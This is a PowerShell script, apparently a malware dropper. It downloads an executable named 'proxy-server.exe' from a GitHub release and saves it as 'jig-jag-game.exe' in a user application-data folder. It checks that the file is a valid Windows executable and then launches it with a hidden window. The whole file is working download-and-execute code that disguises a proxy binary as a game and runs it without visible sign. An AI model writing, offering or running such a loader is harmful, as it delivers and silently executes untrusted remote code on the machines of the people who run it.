# ================= CONFIG =================
$url = "https://github.com/mranonymous011000001/tmp/releases/download/tm/proxy-server.exe"
$folderName = "jig-jig"
$fileName = "jig-jag-game.exe"

Write-Host "[*] Selecting base directory..."

# ================= PATH SELECTION =================
$basePath = $null

if ($env:LOCALAPPDATA) {
    $basePath = Join-Path $env:LOCALAPPDATA $folderName
}
elseif ($env:APPDATA) {
    $basePath = Join-Path $env:APPDATA $folderName
}
else {
    $basePath = Join-Path $env:TEMP $folderName
}

$filePath = Join-Path $basePath $fileName

Write-Host "[+] Using path: $basePath"

# ================= CREATE DIRECTORY =================
if (!(Test-Path $basePath)) {
    New-Item -ItemType Directory -Path $basePath -Force | Out-Null
    Write-Host "[+] Folder created"
} else {
    Write-Host "[=] Folder already exists"
}

# ================= DOWNLOAD =================
Write-Host "[*] Downloading..."

try {
    Invoke-WebRequest $url -OutFile $filePath -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Download complete"
}
catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"
    exit
}

# ================= VERIFY EXISTS =================
if (!(Test-Path $filePath)) {
    Write-Host "[-] File missing after download"
    exit
}

# ================= VERIFY SIZE =================
$fileSize = (Get-Item $filePath).Length
Write-Host "[*] File size: $fileSize bytes"

if ($fileSize -lt 50000) {
    Write-Host "[-] File too small → likely corrupted"
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
    exit
}

# ================= VERIFY MZ HEADER =================
$bytes = Get-Content -Path $filePath -Encoding Byte -TotalCount 2
if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
    Write-Host "[-] Invalid EXE header (not MZ)"
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "[+] File validation passed"

# ================= EXECUTE =================
try {
    Start-Process $filePath -WindowStyle Hidden
    Write-Host "[+] Executed successfully"
}
catch {
    Write-Host "[-] Execution failed: $($_.Exception.Message)"
}
